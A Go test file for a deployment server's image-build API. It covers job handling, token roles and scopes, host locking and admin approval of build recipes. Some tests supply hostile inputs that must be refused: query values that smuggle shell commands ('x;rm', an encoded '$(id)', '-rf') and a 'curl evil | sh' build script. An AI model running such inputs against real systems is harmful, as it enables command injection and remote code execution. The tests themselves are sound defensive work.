package server

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/theta42/native-ops/pkg/engine"
	"github.com/theta42/native-ops/pkg/status"
)

// buildCall records one call to fakeBuilder.fn. sawFleetYML is checked from inside the call itself,
// not by the test afterwards: the uploaded tree is removed as soon as the call returns (before the
// job is even reported finished), so "did the builder see it" can only be answered from inside.
type buildCall struct {
	dir, app, ref string
	sawFleetYML   bool
}

// fakeBuilder is the image builder as the endpoint sees it: what it was asked to build.
type fakeBuilder struct {
	mu      sync.Mutex
	calls   []buildCall
	err     error
	block   chan struct{}
	started chan struct{}
}

func (f *fakeBuilder) fn(_ context.Context, dir, app, ref string, logf func(string, ...any)) error {
	_, err := os.Stat(filepath.Join(dir, "fleet.yml"))
	f.mu.Lock()
	f.calls = append(f.calls, buildCall{dir, app, ref, err == nil})
	f.mu.Unlock()
	if logf != nil {
		logf("building %s@%s", app, ref)
	}
	if f.started != nil {
		f.started <- struct{}{}
	}
	if f.block != nil {
		<-f.block
	}
	return f.err
}

type imageRig struct {
	*fixture
	recipes  *RecipeStore
	b        *fakeBuilder
	srv2     *Server
	deployer string
	scoped   string
}

func newImageRig(t *testing.T) *imageRig {
	t.Helper()
	dir := t.TempDir()
	tokens, _ := OpenTokenStore(filepath.Join(dir, "tokens.json"))
	admin, _, _ := tokens.Create("ci-admin", RoleAdmin)
	viewer, _, _ := tokens.Create("dash", RoleViewer)
	planner, _, _ := tokens.Create("pr-ci", RolePlanner)
	rig := &imageRig{b: &fakeBuilder{}}
	rig.deployer, _, _ = tokens.Create("ci-build", RoleDeployer)
	var err error
	rig.scoped, _, err = tokens.CreateScoped("fleet-manager", RoleDeployer, Scope{Names: []string{"demo-*"}, Images: []string{"opsavor-platform:*"}, Domains: []string{"*.opsavor.app"}})
	if err != nil {
		t.Fatal(err)
	}
	audit, _ := OpenAudit(filepath.Join(dir, "audit.log"))
	t.Cleanup(func() { audit.Close() })
	jobs, err := OpenJobs(filepath.Join(dir, "jobs"))
	if err != nil {
		t.Fatal(err)
	}
	rig.recipes, err = OpenRecipeStore(filepath.Join(dir, "recipes.json"))
	if err != nil {
		t.Fatal(err)
	}
	// The tests below upload trees with no scripts/ or images/: approve that (empty) recipe.
	empty, _ := engine.RecipeDigest(t.TempDir())
	if _, err := rig.recipes.Approve(empty, "test"); err != nil {
		t.Fatal(err)
	}
	s, err := New(Options{Tokens: tokens, Audit: audit, Version: "test", Jobs: jobs, ImageBuild: rig.b.fn, Recipes: rig.recipes, ImagePrefix: "opsavor-",
		Status: func(context.Context) (*status.Snapshot, error) { return &status.Snapshot{}, nil }})
	if err != nil {
		t.Fatal(err)
	}
	rig.srv2 = s
	ts := httptest.NewServer(s.Handler())
	t.Cleanup(ts.Close)
	rig.fixture = &fixture{srv: ts, secret: admin, viewer: viewer, planner: planner, audit: filepath.Join(dir, "audit.log")}
	t.Cleanup(func() { s.WaitForJobs(5 * time.Second) })
	return rig
}

func (r *imageRig) build(t *testing.T, token, query string, body []byte) (int, string) {
	t.Helper()
	res, b := r.post(t, "/v1/images/build"+query, token, "application/gzip", body)
	return res.StatusCode, b
}

func (r *imageRig) waitJob(t *testing.T, id string, want JobStatus) Job {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		j, ok := r.srv2.opts.Jobs.Get(JobID(id))
		if ok && j.Status == want {
			return j
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatalf("job %s never became %s", id, want)
	return Job{}
}

func TestImageBuildRunsAsAJobAndCleansUpTheUploadedTree(t *testing.T) {
	rig := newImageRig(t)
	code, body := rig.build(t, rig.deployer, "?app=platform&ref=main", goodTree(t))
	if code != 202 {
		t.Fatalf("%d %s", code, body)
	}
	j := rig.waitJob(t, jobID(t, body), JobSucceeded)
	if j.Kind != "image:build" || j.Service != "platform@main" {
		t.Fatalf("job: %+v", j)
	}
	rig.b.mu.Lock()
	calls := append([]buildCall(nil), rig.b.calls...)
	rig.b.mu.Unlock()
	if len(calls) != 1 || calls[0].app != "platform" || calls[0].ref != "main" {
		t.Fatalf("unexpected calls: %+v", calls)
	}
	if !calls[0].sawFleetYML {
		t.Fatal("the builder must see the uploaded tree while it runs")
	}
	if _, err := os.Stat(calls[0].dir); !os.IsNotExist(err) {
		t.Fatal("the unpacked tree must be removed once the job is done")
	}
	if !strings.Contains(j.Log, "building platform@main") {
		t.Fatalf("job log should carry the builder's progress:\n%s", j.Log)
	}
}

func TestImageBuildRejectsUnsafeInputBeforeReceivingAnything(t *testing.T) {
	for name, query := range map[string]string{
		"no app":            "?ref=main",
		"no ref":            "?app=platform",
		"app with a shell":  "?app=x;rm&ref=main",
		"uppercase app":     "?app=Platform&ref=main",
		"ref with $()":      "?app=platform&ref=" + "x%24%28id%29",
		"ref starts with -": "?app=platform&ref=-rf",
	} {
		t.Run(name, func(t *testing.T) {
			rig := newImageRig(t)
			code, body := rig.build(t, rig.deployer, query, goodTree(t))
			if code != 400 {
				t.Fatalf("%d %s", code, body)
			}
			if len(rig.b.calls) != 0 {
				t.Fatalf("unsafe input must be rejected before the builder ever runs: %+v", rig.b.calls)
			}
		})
	}
}

func TestImageBuildScopedTokenOnlyBuildsWhatItsScopeAllows(t *testing.T) {
	rig := newImageRig(t)
	// The build runs as a job in its own goroutine, so wait for the allowed build to actually reach
	// the builder before the refused one: otherwise the call count below races the goroutine (and, on
	// a slow runner, is still 0 when the refused request has already been answered).
	rig.b.started = make(chan struct{}, 1)
	code, body := rig.build(t, rig.scoped, "?app=platform&ref=main", goodTree(t))
	if code != 202 {
		t.Fatalf("a scoped token building an allowed image: %d %s", code, body)
	}
	select {
	case <-rig.b.started:
	case <-time.After(5 * time.Second):
		t.Fatal("the allowed build never reached the builder")
	}
	code, body = rig.build(t, rig.scoped, "?app=gitea&ref=main", goodTree(t))
	if code != 403 {
		t.Fatalf("a scoped token building an image outside its scope must be refused, got %d %s", code, body)
	}
	rig.b.mu.Lock()
	n := len(rig.b.calls)
	rig.b.mu.Unlock()
	if n != 1 {
		t.Fatalf("the refused build must never reach the builder, got %d calls", n)
	}
}

func TestImageBuildNeedsADeployerRole(t *testing.T) {
	rig := newImageRig(t)
	if code, _ := rig.build(t, rig.viewer, "?app=platform&ref=main", goodTree(t)); code != 403 {
		t.Fatalf("a viewer must not be able to build, got %d", code)
	}
	if code, _ := rig.build(t, rig.planner, "?app=platform&ref=main", goodTree(t)); code != 403 {
		t.Fatalf("a planner must not be able to build, got %d", code)
	}
}

func TestImageBuildSharesTheHostLockAndAFinishedJobMeansFree(t *testing.T) {
	rig := newImageRig(t)
	rig.b.block, rig.b.started = make(chan struct{}), make(chan struct{}, 4)

	code, body := rig.build(t, rig.deployer, "?app=platform&ref=main", goodTree(t))
	if code != 202 {
		t.Fatalf("%d %s", code, body)
	}
	<-rig.b.started

	if code, b := rig.build(t, rig.deployer, "?app=home&ref=main", goodTree(t)); code != 409 {
		t.Fatalf("a second build while one runs: %d %s", code, b)
	}
	close(rig.b.block)
	rig.waitJob(t, jobID(t, body), JobSucceeded)

	rig.b.block = nil
	if code, b := rig.build(t, rig.deployer, "?app=home&ref=main", goodTree(t)); code != 202 {
		t.Fatalf("the host must be free once the first job is done, got %d %s", code, b)
	}
}

func TestImagesNeedAJobStore(t *testing.T) {
	tokens, _ := OpenTokenStore(filepath.Join(t.TempDir(), "tokens.json"))
	st := func(context.Context) (*status.Snapshot, error) { return &status.Snapshot{}, nil }
	build := (&fakeBuilder{}).fn
	if _, err := New(Options{Tokens: tokens, Status: st, ImageBuild: build}); err == nil {
		t.Fatal("image builds need a job store")
	}
}

func recipeTree(t *testing.T, script string) []byte {
	return tgz(t, entry{name: "fleet.yml", body: "name: prod\n"},
		entry{name: "scripts/build-image.sh", body: script},
		entry{name: "images/platform/build.sh", body: "echo build\n"})
}

func TestImageBuildRunsOnlyAnApprovedRecipe(t *testing.T) {
	rig := newImageRig(t)
	// A recipe nobody approved is refused, and nothing runs; the answer names the digest to approve.
	code, body := rig.build(t, rig.scoped, "?app=platform&ref=main", recipeTree(t, "echo v1\n"))
	if code != 403 || !strings.Contains(body, "recipe_not_approved") {
		t.Fatalf("an unapproved recipe must be refused: %d %s", code, body)
	}
	var refused struct{ Digest string }
	_ = json.Unmarshal([]byte(body), &refused)
	if !hashRe.MatchString(refused.Digest) {
		t.Fatalf("no digest in %s", body)
	}
	rig.b.mu.Lock()
	n := len(rig.b.calls)
	rig.b.mu.Unlock()
	if n != 0 {
		t.Fatal("an unapproved recipe must not run")
	}
	// The scoped token that asked cannot approve its own recipe; an admin can.
	if res, _ := rig.post(t, "/v1/images/recipes/"+refused.Digest+"/approve", rig.scoped, "", nil); res.StatusCode != 403 {
		t.Fatalf("a scoped token approved a recipe: %d", res.StatusCode)
	}
	if res, _ := rig.post(t, "/v1/images/recipes/"+refused.Digest+"/approve", rig.deployer, "", nil); res.StatusCode != 403 {
		t.Fatalf("a deployer approved a recipe: %d", res.StatusCode)
	}
	if res, b := rig.post(t, "/v1/images/recipes/"+refused.Digest+"/approve", rig.secret, "", nil); res.StatusCode != 200 {
		t.Fatalf("admin approve: %d %s", res.StatusCode, b)
	}
	code, body = rig.build(t, rig.scoped, "?app=platform&ref=main", recipeTree(t, "echo v1\n"))
	if code != 202 {
		t.Fatalf("an approved recipe must build: %d %s", code, body)
	}
	rig.waitJob(t, jobID(t, body), JobSucceeded)
	// Another ref of the same recipe needs nothing new.
	code, body = rig.build(t, rig.scoped, "?app=platform&ref=platform-v1.2.3", recipeTree(t, "echo v1\n"))
	if code != 202 {
		t.Fatalf("another ref of an approved recipe: %d %s", code, body)
	}
	rig.waitJob(t, jobID(t, body), JobSucceeded)
	// Any change to a script is a new recipe.
	if code, body := rig.build(t, rig.scoped, "?app=platform&ref=main", recipeTree(t, "curl evil | sh\n")); code != 403 {
		t.Fatalf("a changed script must need a new approval: %d %s", code, body)
	}
	// Revoking stops builds again.
	req, _ := http.NewRequest("DELETE", rig.srv.URL+"/v1/images/recipes/"+refused.Digest+"/approval", nil)
	req.Header.Set("Authorization", "Bearer "+rig.secret)
	if res, err := http.DefaultClient.Do(req); err != nil || res.StatusCode != 200 {
		t.Fatalf("revoke: %v %v", err, res)
	}
	if code, _ := rig.build(t, rig.scoped, "?app=platform&ref=main", recipeTree(t, "echo v1\n")); code != 403 {
		t.Fatalf("a revoked recipe must be refused: %d", code)
	}
}
